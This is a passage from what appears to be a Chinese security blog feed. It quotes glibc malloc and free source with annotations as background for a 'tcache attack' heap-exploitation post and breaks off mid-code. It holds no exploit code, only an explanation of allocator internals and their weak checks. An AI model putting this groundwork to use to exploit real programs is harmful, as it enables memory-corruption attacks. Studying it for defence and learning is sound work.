operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        locked <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token function">free_perturb</span> <span class="token punctuation">(</span><span class="token function">chunk2mem</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */</span>    mchunkptr old <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">,</span> old2<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> old_idx <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0u</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>      <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* Check that the top of the bin is not the record we are going to add       (i.e., double free).  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Check that size of fastbin chunk at the top is the same as       size of the chunk that we are adding.  We can dereference OLD       only if we have the lock, otherwise it might have already been       deallocated.  See use of OLD_IDX below for the actual check.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>      old_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token operator">-></span>fd <span class="token operator">=</span> old2 <span class="token operator">=</span> old<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>old <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_rel</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> p<span class="token punctuation">,</span> old2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> old2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"invalid fastbin entry (free)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/*    Consolidate other non-mmapped chunks as they arrive.  */</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">chunk_is_mmapped</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      locked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    nextchunk <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Lightweight tests: check whether the block is already the       top block.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (top)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">contiguous</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span>              <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> nextchunk              <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> av<span class="token operator">-></span>top <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (out)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* Or whether the block is actually not marked used.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (!prev)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    nextsize <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>nextchunk<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>nextsize <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (normal)"</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token function">free_perturb</span> <span class="token punctuation">(</span><span class="token function">chunk2mem</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* consolidate backward */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>      size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nextchunk <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* get and clear inuse bit */</span>      nextinuse <span class="token operator">=</span> <span class="token function">inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> nextsize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* consolidate forward */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nextinuse<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> nextchunk<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>    size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span>    <span class="token function">clear_inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/*    Place the chunk in unsorted chunk list. Chunks are    not placed into regular bins until after they have    been given one chance to be used in malloc.      */</span>      bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>      fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): corrupted unsorted chunks"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      p<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>      p<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      p<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      p<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      bck<span class="token operator">-></span>fd <span class="token operator">=</span> p<span class="token punctuation">;</span>      fwd<span class="token operator">-></span>bk <span class="token operator">=</span> p<span class="token punctuation">;</span>      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">set_foot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">check_free_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      If the chunk borders the current high end of memory,      consolidate into top    */</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>      size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>      <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>      av<span class="token operator">-></span>top <span class="token operator">=</span> p<span class="token punctuation">;</span>      <span class="token function">check_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don't know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don't want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">==</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">ifndef</span> MORECORE_CANNOT_TRIM</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span>        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>trim_threshold<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">systrim</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>top_pad<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* Always try heap_trim(), even if the top chunk is not       large, because the corresponding heap might go away.  */</span>    heap_info <span class="token operator">*</span>heap <span class="token operator">=</span> <span class="token function">heap_for_ptr</span><span class="token punctuation">(</span><span class="token function">top</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>heap<span class="token operator">-></span>ar_ptr <span class="token operator">==</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">heap_trim</span><span class="token punctuation">(</span>heap<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>top_pad<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/*    If the chunk was allocated via mmap, release via munmap().  */</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">munmap_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>相关参考:</p><blockquote><p><a href="https://blog.csdn.net/conansonic/article/details/50241523" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/50241523</a><br>glibc 2.23源码</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_attack</title>
      <link href="/2020/01/30/tcache-attack/"/>
      <url>/2020/01/30/tcache-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="tcache-attack-glibc-2-26"><a href="#tcache-attack-glibc-2-26" class="headerlink" title="tcache attack glibc 2.26"></a>tcache attack glibc 2.26</h1><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，它带来了很多新的堆攻击方式。</p><h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p><strong>tcache_entry</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry<span class="token punctuation">{</span>  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span></code></pre><p>这个结构体用于储存free后的tcache堆块,单链表结构，next指针指向下一个堆块的usr data部分（fastbin指向的chunk_header部分）,同时采用FILO（先进后出）的存取方式。<br><strong>tcache_perthread_struct teache的管理器</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct<span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//tcache链上的空闲堆块个数，每个链上最多7个</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span><span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_MAX_BINS                64</span><span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></code></pre><p>wiki上的图特别好：<br><img src="/2020/01/30/tcache-attack/image-20200120100444353.png" title="This is an image"></p><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><ul><li>第一次malloc,会先申请个堆块存放tcache_prethread_struct</li><li>free的堆块先放入tcache(size合适的话)<ul><li>tcache对应链表没满之前，先放入该链表，满了之后才放入fastbin或者unsorted bin这些。</li><li>malloc时先从对应tcache中取</li><li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul></li></ul><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><strong>__libc_malloc</strong>  —&gt; 在源码的最前面添加了tcache相关代码</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__libc_malloc</span> <span class="token punctuation">(</span>size_t bytes<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>  <span class="token comment" spellcheck="true">/* int_free also calls request2size, be careful to not pad twice.  */</span>  size_t tbytes<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span>  <span class="token function">checked_request2size</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> tbytes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//求出chunk实际大小</span>  size_t tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>tbytes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//计算对应idx</span>  <span class="token comment" spellcheck="true">// 初始化 tcache ，tcache为空（第一次malloc）的时候调用建立tcache_prethread_struct</span>  <span class="token function">MAYBE_INIT_TCACHE</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   DIAG_PUSH_NEEDS_COMMENT<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins  <span class="token comment" spellcheck="true">// 根据 size 得到的 idx 在合法的范围内</span>      <span class="token comment" spellcheck="true">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="token comment" spellcheck="true">/* to appease gcc */</span>      <span class="token operator">&amp;&amp;</span> tcache <span class="token comment" spellcheck="true">//所需的tcache在链表中存在</span>      <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// tcache->entries[tc_idx] 有 chunk</span>    <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">tcache_get</span> <span class="token punctuation">(</span>tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从链表中取出所需的chunk</span>    <span class="token punctuation">}</span>  DIAG_POP_NEEDS_COMMENT<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><p><strong>tcache_put()</strong> </p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span><span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//找到对应chunk</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//idx合法判断</span>  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 这两个操作是把free的chunk放入了链表的头部，对应了FILO的规则</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>   <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对应tcache数量加1</span><span class="token punctuation">}</span></code></pre><p>我们可以看出没什么大的保护操作，没有指针置0。<br><strong>__libc_free</strong> 变化不大 ，变化主要是在_int_free里面</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">__libc_free</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">MAYBE_INIT_TCACHE</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//tcache不为空时没用</span>  ar_ptr <span class="token operator">=</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_int_free</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>_int_free</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">_int_free</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">,</span> <span class="token keyword">int</span> have_lock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>  <span class="token punctuation">{</span>    size_t tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//求出对应的idx</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache        <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins <span class="token comment" spellcheck="true">// 64 idx合法,tcache链表中数量小于等于7</span>        <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 7</span>      <span class="token punctuation">{</span>        <span class="token function">tcache_put</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//放入链表</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">endif</span></span></code></pre><h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><p>从<strong>libc</strong>malloc里面我们可以看出是如何进入tcache_get的。<br><strong>tcache_get()</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//判断idx是否合法</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取出来的指针不为0,</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> 